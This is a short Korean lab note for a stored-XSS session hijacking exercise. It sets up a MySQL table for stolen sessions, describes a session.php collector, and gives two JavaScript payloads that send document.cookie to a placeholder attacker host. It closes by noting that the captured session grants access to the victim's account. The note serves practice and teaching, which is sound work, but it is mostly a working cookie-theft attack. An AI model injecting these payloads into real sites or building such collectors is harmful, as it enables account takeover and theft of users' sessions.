# 세션 하이재킹 웹어플리케이션 실습

1. 테이블 생성
> mysql -u root
> create database xss_attack;
> use xss_attack;
>
> create table session_list(date date, ip varchar(15), session varchar(50));
>
> desc session_list;
>
> select * from session_list;

2. session.php 추가
- data parameter를 통해 세션 정보를 탈취해서 db에 저장

3. STORED XSS를 통한 세션 하이재킹 공격 실습
    1. 브라우저 두개를 열고 실습
    2. 세션 하이재킹 스크립트
    ```javascript
    // 방법1
    location.href = "http://IP_ADDRESS/xss_attack/session.php" + document.cookie;
    // 방법2
    new Image().src = "http://IP_ADDRESS/xss_attack/session.php" + document.cookie;
    ```
    3. 저장된 세션 정보로 브라우저 개발자 도구에서 세션을 변경하면 해당 사용자의 계정으로 접근 가능